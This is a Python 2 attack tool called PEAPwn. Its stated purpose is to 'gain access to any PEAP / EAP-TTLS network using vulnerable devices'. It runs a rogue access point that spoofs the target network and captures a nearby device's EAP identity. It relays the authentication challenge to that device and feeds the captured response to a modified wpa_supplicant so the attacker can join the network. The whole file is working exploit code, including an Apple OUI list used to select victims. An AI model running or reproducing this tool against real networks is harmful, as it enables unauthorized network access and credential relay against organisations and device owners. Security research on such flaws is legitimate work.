#!/bin/env python2

import argparse
from scapy.all import *
from snoopsys import *
from eap import *
from fakeap import FakeAccessPoint
import subprocess
import socket
import os
import sys

# Parse commandline arguments
parser = argparse.ArgumentParser(description="Gain access to any PEAP / EAP-TTLS network using vulnerable devices.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument('infra_if', help='supplicant interface (e.g. wlan1)')
parser.add_argument('mon_if', help='interface to run in monitor mode (e.g. wlan0)')
parser.add_argument('essid', help='ESSID of PEAP network to attack')
parser.add_argument('--debug', '-d', dest='debug', help='verbose wpa_supplicant', action='store_true')
parser.add_argument('--nooui', '-n', dest='nooui', help='don\'t use OUI list to identify vulnerable devices', action='store_true')
args = vars(parser.parse_args())

wpa_supplicant_conf = """
    ctrl_interface=/var/run/wpa_supplicant
    eapol_version=1
    ap_scan=1
    fast_reauth=1

    network={
      phase1="crypto_binding=0"
      ssid="${essid}"
      key_mgmt=IEEE8021X WPA-NONE WPA-EAP
      eap=PEAP
      priority=2
      auth_alg=OPEN
      password=hash:00000000000000000000000000000000
      identity="${identity}"
    }
"""

apple_oui = ['00:03:93', '00:05:02', '00:0A:27', '00:0A:95', '00:0D:93', '00:10:FA', '00:11:24', '00:14:51', '00:16:CB', '00:17:F2', '00:19:E3', '00:1B:63', '00:1C:B3', '00:1D:4F', '00:1E:52', '00:1E:C2', '00:1F:5B', '00:1F:F3', '00:21:E9', '00:22:41', '00:23:12', '00:23:32', '00:23:6C', '00:23:DF', '00:24:36', '00:25:00', '00:25:4B', '00:25:BC', '00:26:08', '00:26:4A', '00:26:B0', '00:26:BB', '00:30:65', '00:3E:E1', '00:50:E4', '00:88:65', '00:A0:40', '00:C6:10', '00:F4:B9', '04:0C:CE', '04:15:52', '04:1E:64', '04:26:65', '04:48:9A', '04:54:53', '04:DB:56', '04:E5:36', '04:F1:3E', '04:F7:E4', '08:00:07', '08:70:45', '0C:30:21', '0C:3E:9F', '0C:4D:E9', '0C:74:C2', '0C:77:1A', '10:1C:0C', '10:40:F3', '10:93:E9', '10:9A:DD', '10:DD:B1', '14:10:9F', '14:5A:05', '14:8F:C6', '14:99:E2', '18:20:32', '18:34:51', '18:9E:FC', '18:AF:61', '18:AF:8F', '18:E7:F4', '1C:1A:C0', '1C:AB:A7', '1C:E6:2B', '20:7D:74', '20:C9:D0', '24:A2:E1', '24:AB:81', '28:0B:5C', '28:37:37', '28:6A:B8', '28:6A:BA', '28:CF:DA', '28:CF:E9', '28:E0:2C', '28:E1:4C', '28:E7:CF', '2C:B4:3A', '30:10:E4', '30:90:AB', '30:F7:C5', '34:15:9E', '34:51:C9', '34:C0:59', '34:E2:FD', '38:0F:4A', '38:48:4C', '3C:07:54', '3C:15:C2', '3C:D0:F8', '3C:E0:72', '40:30:04', '40:3C:FC', '40:6C:8F', '40:A6:D9', '40:B3:95', '40:D3:2D', '44:2A:60', '44:4C:0C', '44:D8:84', '44:FB:42', '48:60:BC', '48:74:6E', '4C:8D:79', '4C:B1:99', '50:EA:D6', '54:26:96', '54:72:4F', '54:AE:27', '54:E4:3A', '54:EA:A8', '58:1F:AA', '58:55:CA', '58:B0:35', '5C:59:48', '5C:95:AE', '5C:96:9D', '5C:F9:38', '60:03:08', '60:33:4B', '60:69:44', '60:C5:47', '60:D9:C7', '60:FA:CD', '60:FB:42', '60:FE:C5', '64:20:0C', '64:76:BA', '64:A3:CB', '64:B9:E8', '64:E6:82', '68:09:27', '68:5B:35', '68:96:7B', '68:9C:70', '68:A8:6D', '6C:3E:6D', '6C:70:9F', '6C:C2:6B', '70:11:24', '70:56:81', '70:73:CB', '70:CD:60', '70:DE:E2', '74:E1:B6', '74:E2:F5', '78:31:C1', '78:6C:1C', '78:A3:E4', '78:CA:39', '7C:11:BE', '7C:6D:62', '7C:C3:A1', '7C:C5:37', '7C:D1:C3', '7C:F0:5F', '7C:FA:DF', '80:00:6E', '80:49:71', '80:92:9F', '80:EA:96', '84:29:99', '84:38:35', '84:85:06', '84:8E:0C', '84:FC:FE', '88:1F:A1', '88:53:95', '88:C6:63', '88:CB:87', '8C:00:6D', '8C:29:37', '8C:2D:AA', '8C:58:77', '8C:7B:9D', '8C:7C:92', '8C:FA:BA', '90:27:E4', '90:72:40', '90:84:0D', '90:B2:1F', '90:B9:31', '94:94:26', '98:03:D8', '98:B8:E3', '98:D6:BB', '98:F0:AB', '98:FE:94', '9C:04:EB', '9C:20:7B', 'A0:ED:CD', 'A4:67:06', 'A4:B1:97', 'A4:C3:61', 'A4:D1:D2', 'A8:20:66', 'A8:86:DD', 'A8:88:08', 'A8:96:8A', 'A8:BB:CF', 'A8:FA:D8', 'AC:3C:0B', 'AC:7F:3E', 'AC:CF:5C', 'AC:FD:EC', 'B0:34:95', 'B0:65:BD', 'B0:9F:BA', 'B4:18:D1', 'B4:F0:AB', 'B8:17:C2', 'B8:78:2E', 'B8:8D:12', 'B8:C7:5D', 'B8:E8:56', 'B8:F6:B1', 'B8:FF:61', 'BC:3B:AF', 'BC:52:B7', 'BC:67:78', 'BC:92:6B', 'C0:63:94', 'C0:84:7A', 'C0:9F:42', 'C4:2C:03', 'C8:2A:14', 'C8:33:4B', 'C8:6F:1D', 'C8:B5:B7', 'C8:BC:C8', 'C8:E0:EB', 'C8:F6:50', 'CC:08:E0', 'CC:78:5F', 'D0:23:DB', 'D0:E1:40', 'D4:9A:20', 'D8:00:4D', 'D8:30:62', 'D8:96:95', 'D8:9E:3F', 'D8:A2:5E', 'D8:D1:CB', 'DC:2B:61', 'DC:86:D8', 'DC:9B:9C', 'E0:B9:BA', 'E0:C9:7A', 'E0:F5:C6', 'E0:F8:47', 'E4:25:E7', 'E4:8B:7F', 'E4:98:D6', 'E4:C6:3D', 'E4:CE:8F', 'E8:04:0B', 'E8:06:88', 'E8:8D:28', 'EC:35:86', 'EC:85:2F', 'F0:B4:79', 'F0:C1:F1', 'F0:CB:A1', 'F0:D1:A9', 'F0:DB:F8', 'F0:DC:E2', 'F0:F6:1C', 'F4:1B:A1', 'F4:37:B7', 'F4:F1:5A', 'F4:F9:51', 'F8:1E:DF', 'F8:27:93', 'FC:25:3F']

class ChallengeDomSock():
    def __init__(self):
        self.sock_fd = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.client = None

        # Create Unix domain socket
        try:
            os.remove("/tmp/peapwn.sock")
        except OSError:
            pass
        self.sock_fd.bind("/tmp/peapwn.sock")
        self.sock_fd.listen(1)

    def wait(self):
        debug_print("[+] Waiting for challenge from wpa_supplicant.", Level.INFO)
        self.client, addr = self.sock_fd.accept()
        data = self.client.recv(8)

        debug_print(clr(Color.GREEN, "[+] Got challenge (" + bytes_to_hex(str(data)) + "). Relaying."), Level.INFO)

        return data

    def submit(self, challenge_response):
        if self.client != None:
            debug_print(clr(Color.GREEN, "[+] Wrote response (" + bytes_to_hex(str(challenge_response)) + ")!"), Level.INFO)
            self.client.send(challenge_response)
            self.client.close()
            return True
        else:
            return False

class State:
    CATCH = 0
    IDENTITYCAP = 1
    CHALLENGECAP = 2
    RESPONSECAP = 3
    COMPLETE = 4
    FAIL = 5

# Timer used for determining failure of an attack stage
class Timer(threading.Thread):
    def __init__(self, duration, pwn, error_message):
        threading.Thread.__init__(self)
        self.duration = duration
        self.pwn = pwn
        self.start_time = time.time()
        self.error_message = error_message
        self.stop = False

    def run(self):
        while True and not self.stop:
            time.sleep(1)

            if time.time() - self.start_time > self.duration:
                self.pwn.state = State.FAIL
                self.pwn.error_message = self.error_message
                break

    def restart(self, duration, error_message):
        self.stop = False
        self.start_time = time.time()
        self.duration = duration
        self.error_message = error_message


class Exploiter(threading.Thread):
    def __init__(self, ap, target_mac, target_identity, pwn):
        threading.Thread.__init__(self)
        self.ap = ap
        self.setDaemon(True)
        self.interval = 1
        self.target_mac = target_mac
        self.target_identity = target_identity
        self.pwn = pwn
        self.start_time = time.time()
        self.stop = False

    def run(self):
        # Keep the device busy while wpa_supplicant is active by requesting the challenge response multiple times
        while True and not self.stop:
            self.ap.injectEAPPacket(self.target_mac, EAPCode.REQUEST, EAPType.EAP_LEAP, "\x01\x00\x08" + str(self.pwn.challenge) + str(self.target_identity))
            time.sleep(self.interval)

class PEAPwn():
    def __init__(self):
        self.mon_mac = None
        self.infra_mac = None
        self.monitor_dev = None
        self.state = State.CATCH
        self.identity = ""
        self.identity_mac = None
        self.target_essid = args['essid']
        self.ap = None
        self.challenge = "nothing!"
        self.response = None
        self.print_count = 0
        self.exploiter = None
        self.dom_sock = ChallengeDomSock()
        self.wpa_proc = None
        self.error_message = "unknown"

    def write_config(self):
        global wpa_supplicant_conf

        fileHandler = open('peapwn.conf','w')
        wpa_supplicant_conf = wpa_supplicant_conf.replace("${identity}", self.identity)
        wpa_supplicant_conf = wpa_supplicant_conf.replace("${essid}", self.target_essid)
        fileHandler.write(wpa_supplicant_conf)
        fileHandler.close()

    def start_wpa_supplicant(self):
        # Write configuration for wpa_supplicant
        self.write_config()

        # Start wpa_supplicant
        debug = ""
        cur_stdout = subprocess.PIPE
        cur_stderr = subprocess.PIPE
        if(args['debug']):
            debug = "-ddd"
            cur_stdout = sys.stdout
            cur_stderr = sys.stderr
        self.wpa_proc = subprocess.Popen(['../mods/hostap/wpa_supplicant/wpa_supplicant', '-Dwext', '-i' + args['infra_if'], '-c./peapwn.conf', '-K', debug], stdout=cur_stdout, stderr=cur_stderr, close_fds=True)

    def is_vulnerable(self, source_mac):
        source_oui = source_mac[0:8].upper()
        result = (source_oui in apple_oui)

        if not result:
            debug_print(clr(Color.GREY, "[*] Caught " + source_mac + ", but this device is not vulnerable."), Level.INFO)

        return result

    def sniff_callback(self, packet):
        global args

        try:
            # Spoof stage
            if self.state == State.CATCH:
                if packet.type == 0x00: # Management
                    if packet.subtype == 4: # Probe request
                        ssid = packet[Dot11Elt].info

                        debug_print("Probe request for SSID %s by MAC %s" % (ssid, packet.addr2), Level.DEBUG)

                        if ssid == self.target_essid or (Dot11Elt in packet and packet[Dot11Elt].len == 0):
                            self.ap.injectProbeResponse(packet.addr2, self.target_essid)
                    elif packet.subtype == 0x0B: # Authentication
                        if packet.addr1 == self.mon_mac: # We are the receivers
                            if args['nooui']:
                                self.ap.sc = -1 # Reset sequence number
                                self.ap.injectAuthSuccess(packet.addr2)
                            else:
                                if self.is_vulnerable(packet.addr2):
                                    self.ap.sc = -1 
                                    self.ap.injectAuthSuccess(packet.addr2)
                    elif (packet.subtype == 0x00 or packet.subtype == 0x02): # Association
                        if packet.addr1 == self.mon_mac: # We are the receivers
                            self.ap.injectAssociationSuccess(packet.addr2, packet.subtype)
                            self.ap.injectEAPPacket(packet.addr2, EAPCode.REQUEST, EAPType.IDENTITY, None)
                            self.state = State.IDENTITYCAP
                            debug_print("[+] Waiting for identity response.", Level.INFO)
                            self.timer = Timer(10, self, "device failed to answer identity request")
                            self.timer.start()

            # Capture identity stage
            if self.state == State.IDENTITYCAP:
                if packet.type == 0x02 and packet.addr1 == self.mon_mac: # Data frames
                    if EAP in packet:
                        if packet[EAP].code == EAPCode.RESPONSE: # Responses
                            if packet[EAP].type == EAPType.IDENTITY:
                                raw_identity = str(packet[Raw])
                                if packet.addr1 == self.mon_mac:
                                    self.identity = raw_identity[0:len(raw_identity) - 4]

                                    # EAP Identity Response
                                    debug_print(clr(Color.GREEN, "[+] Caught identity: '" + self.identity + "'. Starting wpa_supplicant."), Level.INFO)
                                    self.timer.restart(20, "wpa_supplicant failed to get challenge from AP. Make sure client certificates are disabled")
                                    self.identity_mac = packet.addr2
                                    self.start_wpa_supplicant()
                                    self.state = State.CHALLENGECAP

                    if EAPOL in packet:
                        # Client did not see our initial identity request. Send it again!
                        if packet[EAPOL].type == 0x01:
                            self.ap.injectEAPPacket(packet.addr2, EAPCode.REQUEST, EAPType.IDENTITY, None)

            # Wait for challenge from wpa_supplicant
            if self.state == State.CHALLENGECAP:
                self.challenge = self.dom_sock.wait()

                # Start our exploit
                self.timer.restart(20, "failed to get challenge response from target. Make sure the device is vulnerable")
                self.exploiter = Exploiter(self.ap, self.identity_mac, self.identity, self)
                self.exploiter.start()
                self.state = State.RESPONSECAP

            # Wait for challenge response from device
            if self.state == State.RESPONSECAP:
                if packet.type == 0x02:
                    if packet.addr2 == self.identity_mac and packet.addr1 == self.mon_mac:
                        if EAP in packet:
                            if packet[EAP].type == EAPType.EAP_LEAP:
                                raw_data = str(packet[Raw])
                                self.response = raw_data[3:27]

                                if self.dom_sock.submit(self.response):
                                    if len(self.response) == 24:
                                        self.state = State.COMPLETE
                                    else:
                                        self.state = State.FAIL
                                        self.error_message = "expected 24-byte challenge response, but got '%s'" % self.response

            if self.state == State.COMPLETE:
                debug_print(clr(Color.GREEN, "[+] Attack successful. Run dhcpcd to get an IP address now."), Level.INFO)
                self.destroy()

            if self.state == State.FAIL:
                debug_print(clr(Color.RED, "[-] Attack failed. Reason: %s. Retrying." % self.error_message), Level.CRITICAL)
                if self.wpa_proc:
                    self.wpa_proc.kill()

                if self.timer:
                    self.timer.stop = True

                if self.exploiter:
                    self.exploiter.stop = True

                self.state = State.CATCH
                debug_print("[+] Spoofing %s." % (self.target_essid), Level.INFO)


        except Exception as err:
            debug_print(clr(Color.RED, "[-] Unknown error: %s" % repr(err)), Level.CRITICAL)

    def destroy(self):
        self.timer.stop = True
        self.exploiter.stop = True
        set_monitor_mode(self.monitor_dev, False)
        exit()

    def run(self):
        # Check root
        check_root()

        # Pi warning
        if RUNNING_ON_PI:
            debug_print(clr(Color.MAGENTA, "*** RUNNING ON PI ***"), Level.CRITICAL)

        # Setup interface
        self.monitor_dev = set_monitor_mode(args['mon_if'])
        self.mon_mac = get_if_hwaddr(args['mon_if'])
        self.infra_mac = get_if_hwaddr(args['infra_if'])
        conf.logLevel = 0 # Do not let scapy log anything
        conf.iface = self.monitor_dev

        # Create our rogue AP
        self.ap = FakeAccessPoint(self.monitor_dev, 1, self.mon_mac, '1', True)
        self.ap.addSSID(self.target_essid)
        debug_print("[+] Spoofing %s." % (self.target_essid), Level.INFO)

        # Start sniffing
        sniff(iface = self.monitor_dev, prn = self.sniff_callback, store = 0, filter = "(ether dst host " + self.mon_mac + " or ether dst host " + self.infra_mac + ") or wlan type mgt and (ether dst host ff:ff:ff:ff:ff:ff or ether dst host " + self.mon_mac + ")")


peapwn = PEAPwn()
peapwn.run()
peapwn.destroy()